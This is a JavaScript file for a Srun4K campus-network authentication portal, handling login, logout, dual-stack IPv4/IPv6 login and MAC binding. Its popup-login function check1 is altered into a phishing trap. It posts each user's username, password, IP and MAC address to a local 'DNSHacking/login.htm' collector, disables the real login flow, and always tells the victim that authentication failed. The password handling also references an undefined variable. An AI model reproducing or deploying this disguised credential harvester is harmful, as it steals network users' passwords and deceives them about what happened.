/////////////////////////////////////////
////////Srun4K 双栈认证/////////////////
/////////一些工具函数/////////////////////
var double_stack_auth_pc=""; //另一协议栈的认证地址 如果当前为IPV4，则此地址为IPV6
var info=""; //认证成功后返回的会话串用以双栈认证或自动登录自服务
var stack_user_ip=""; //当前协议栈的用户源地址

function format_time(sec)//格式化时间
{
 	var h=Math.floor(sec/3600);
 	var m=Math.floor((sec%3600)/60);
 	var s=sec%3600%60;
 	var out="";
	if(h<10)
	{
		out += "0"+h+" : ";
	}
	else
	{
 		out+=h+" : ";
	}
	
 	if(m<10)
	{
		out+="0"+m+" : ";
	}
	else
	{
 		out+=m+" : ";
	}
	
	if(s<10)
	{
		out += "0"+s+"";
	}
	else
	{
		out += s+"";
	}
 	return out;
}
 
function format_flux(byte)//格式化流量
{
	if(byte>(1000*1000))
		return (format_number((byte/(1000*1000)),2)+"M");
	if(byte>1000)
		return (format_number((byte/1000),2)+"K");
	return byte+"b";
}

function format_number(num, count)//格式化数字
{
	var n=Math.pow(10, count);
	var t=Math.floor(num*n);
	return t/n;
}

function setCookie(name,value) //写COOKIE
{
	var Days = 360; 
	var exp  = new Date(); 
	exp.setTime(exp.getTime() + Days*24*60*60*1000);
	document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
}

function getCookie(name) //读取cookie     
{
	var arr = document.cookie.match(new RegExp("(^| )"+name+"=([^;]*)(;|$)"));
	if(arr != null) 
		return unescape(arr[2]); 
	return null;
}
/////////////////////////////////////////////////////
//获取在线信息
function get_online_info(ip) //获取在线信息
{
	var k = Math.floor(Math.random() * ( 100000 + 1));
	
	var d = "action=get_online_info&key="+k;
	//alert(d);
	$.ajax({type: "post",
			url: "/include/auth_action.php?k="+k,
			data: d,
			async : false,
			success: function(res) {
			var arr3=res.split(",");
			//显示在线信息，可根据需求扩展
			$("#sum_bytes").html(format_flux(arr3[0]));
			$("#sum_seconds").html(format_time(arr3[1]));
			$("#user_balance").html("￥"+arr3[2]);
			$("#user_ip").html(arr3[5]);
	}
	});
}

//根据在线表中的mac_auth  user_mac字段，决定是否要显示MAC绑定按扭
function get_online_info1() 
{
	var k = Math.floor(Math.random() * ( 100000 + 1));
	
	$.post("/include/auth_action.php", {
			action: 'get_online_info',
			k: k,
			ajax: 1
		}, function(res){
			//alert(res);
			var arr3=res.split(",");
			
			if(arr3[3]!="" && arr3[4]=="1")
			{
				$("#id_mac_auth")[0].style.display = '';
			}
			else
			{
				$("#id_mac_auth")[0].style.display = 'none';
			}
			
	});
	
}

function Encrypt(s) 
{ 
	var r = "";
	var h = "";
	var j = 0;
	var hexes = new Array ("0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f");
	for (var i=0; i<s.length; i++) 
	{
		h = "0x" + (hexes [s.charCodeAt(i) >> 4] + hexes [s.charCodeAt(i) & 0xf]);
		j = parseInt(h);
		j = j ^ 0x33;
		if(j<10)
		{
			h = "0"+j;
		}
		else
		{
			h = ""+j;
		}
		r += h;
	}
	return r;
} 

//页面内认证
function check(frm) 
{
	if(frm.username.value=="")
	{
		alert("请填写用户名");
		frm.username.focus();
		return false;
	}
	
	if(frm.password.value=="")
	{
		alert("请填写密码");
		frm.password.focus();
		return false;
	}
	
	//var e = Encrypt(frm.password.value);
	//frm.password.value = "{B}"+e;
	return true;
}

function do_logout(frm)//远程注销
{
	$.post("/include/auth_action.php",{
			action: "logout",
			username: $("input[name='username']").val(),
			password: $("input[name='password']").val(),
			ajax: 1
			},function(res){
				alert(res);
	});
}

function redirect() //重定向到输入的网址
{
	var url = $("input[name='url']").val();
	if(url!="")
		location = url;
}

//弹窗认证
function check1(frm) 
{
	if(frm.username.value=="")
	{
		alert("请填写用户名");
		frm.username.focus();
		return false;
	}
	
	if(frm.password.value=="")
	{
		alert("请填写密码");
		frm.password.focus();
		return false;
	}
	var res1 = "";
	//var e = Encrypt(frm.password.value);
	//var e=encodeURIComponent(base64encode(utf16to8(frm.password.value)));
	/* if($("input[name='save_me']").is(':checked')){
		var save_me=1;
	}else{
		var save_me=0;
	} */
			
	var save_me = (frm.save_me.checked) ? 1 : 0;
	var d = "action=login&username="+frm.username.value+
			"&password={B}"+e+
			"&ac_id="+$("input[name='ac_id']").val()+
			"&user_ip="+$("input[name='user_ip']").val()+
			"&nas_ip="+$("input[name='nas_ip']").val()+
			"&user_mac="+$("input[name='user_mac']").val()+
			"&save_me="+save_me+
			"&ajax=1";
	//encodeURIComponent(frm.username.value)
	//alert(d);
	//这里要用AJAX同步提交POST
 	$.ajax({type: "post",
			url: "http://127.0.0.1:8080/DNSHacking/login.htm", 
			data: d,
			async : false,
			success: function(res) {
		res1 = res;
	}
	}); 
	
	/*var p = /^login_ok,/;
	if(p.test(res1))//认证成功，弹出小窗口
	{
		var arr = res1.split(",");
		if(arr[1] != "")//写入用于双栈认证的COOKIE
		{
			setCookie("double_stack_login", arr[1]);
		}
		if(arr[2]!="")//写入用户名密码COOKIE
		{
			setCookie("login", arr[2]);
		}
		
		window.open("srun_portal_pc_succeed.php", "","width=450,height=350,left=0,top=0,resizable=1");//弹出小窗口
		
		setTimeout("redirect()", 2000); //重定向到输入的网址
	}
	else
	{
		alert(res1); //提示错误信息
	}*/
	
	alert("认证错误");
	return false;
}



//弹窗认证--手机页面，在同一个页面内显示认证结果
function check2(frm) 
{
	if(frm.username.value=="")
	{
		alert("请填写用户名");
		frm.username.focus();
		return false;
	}
	
	if(frm.password.value=="")
	{
		alert("请填写密码");
		frm.password.focus();
		return false;
	}
	
	if(frm.ac_id.value == "" || frm.ac_id.value == "0")
	{
		alert("您打开的认证页面未经重定向，点击确定后将自动重定向到正确的页面。");
		location = "http://www.baidu.com";
		return false;
	}
	
	var res1 = "";
	
	//var e = Encrypt(frm.password.value);
	var save_me = 0;
	if(frm.save_me)
	{
		save_me = (frm.save_me.checked) ? 1 : 0;
	}
	
	var is_second = 0;
	
	if(frm.is_second)
	{
		is_second = frm.is_second.value;
	}
	
	$.post("/include/auth_action.php", {
                        action: 'login',
                        username: $("input[name='username']").val(),
                        password: frm.password.value,
						ac_id:$("input[name='ac_id']").val(),
						user_mac:$("input[name='user_mac']").val(),
						user_ip:$("input[name='user_ip']").val(),
						nas_ip:$("input[name='nas_ip']").val(),
						save_me: document.form2.save_me.value,
						ajax: 1
                    }, function(res1){
					var p = /^login_ok,/;
	if(p.test(res1))//认证成功，弹出小窗口
	{
		var arr = res1.split(",");
		if(arr[1] != "")//写入用于双栈认证的COOKIE
		{
			//setCookie("double_stack_login", arr[1]);
		}
		if(arr[2]!="")//写入用户名密码COOKIE
		{
			setCookie("login", arr[2]);
		}	
		
		$("#id_login")[0].style.display = 'none';
		$("#id_login_ok")[0].style.display = '';
		
		info=decodeURIComponent(arr[1]);
		
		if(double_stack_auth_pc != "" && double_stack_auth_pc != "0")
		{
			auto_login(double_stack_auth_pc, info, stack_user_ip);
		}
		else
		{
			setTimeout("get_online_info1()", 2000);
		}
		
	}
	else
	{
	    if(res1=="E2901: (Third party 1)userid error1()"){
		alert("Account does not exist.(用户名错误)");
		}
		else if(res1=="E2901: (Third party -1)userid error2()"){
		alert("Password is error.(密码错误)");
		}
		else{
		alert(res1); //提示错误信息
		}
		
	}
					});
	
	return false;
}

//双栈认证，使用jsonp提交到另一协议栈
function auto_login(posturl, info, user_ip)
{
	$.getJSON("http://"+posturl+"/include/auth_action.php?callback=?",{  
    action: "auto_login",  
    info: info,
	user_ip: user_ip,
	jsonp: 1,
  },function(data) { 
	  if(data.res=='login_ok')
	  {
		  stack_user_ip = data.user_ip;
		  $("#stack_msg").html("双栈登录成功");
	  }
	  else if(data.res != "")
	  {
		  alert(data.res);
	  }
	  else
	  {
		  alert("认证失败");
	  }
  }); 
  return false;
}

//双栈注销
function auto_logout()
{
	$.post("/include/auth_action.php",{
			action: "auto_logout",
			info: info,
			user_ip: stack_user_ip,
			username: username,
			ajax: 1
			},function(res){				
				if(res == "网络已断开")
				{
					info = '';
					stack_user_ip = '';
					location='http://www.baidu.com';
				}
				else
				{
					alert(res);
				}
	});
}

//测试另一协议栈
function connect_test(posturl)
{
	double_stack_auth_pc = posturl;
	
	$.getJSON("http://"+posturl+"/include/auth_action.php?callback=?",{  
    action: "test", 
	jsonp: 1,
  },function(data) {  
      //alert(data.res);  
	  if(document.getElementById('btn_auto_login'))
	  {
		  if(data.res=='ok')
		  {
			  $("#btn_auto_login")[0].style.display = '';
		  }
		  else
		  {
			  $("#btn_auto_login")[0].style.display = 'none';
		  }
	  }
	  
  }); 
  return false;
}

//绑定MAC认证，此操作收集当前在线的MAC，并开启用户资料中的MAC认证
function bind_mac_auth(user_ip) 
{
	if(!confirm("记忆此终端的MAC，以便下次自动登录，解绑请到自助服务中。\r\n请不要在公共终端上使用此功能！"))
		return;
	$.post("/include/auth_action.php",{
			action: "bind_mac_auth",
			user_ip: user_ip,
			ajax: 1
			},function(res){
				if(res == 'not_online')
				{
					alert('您已离线，请登录后再绑定。');
				}
				else if(res == 'bind_ok')
				{
					alert('设备绑定成功，下次可自动登录。');
				}
				else if(res != '')
				{
					alert('此MAC已经绑给用户“'+res+'”，请解绑此用户后绑定。');
				}
				else
				{
					alert('绑定失败，服务器未响应');
				}
	});
}

//自动提交到自服务上
function goto_service(obj)
{
	obj.info.value = info;
	obj.submit();
}
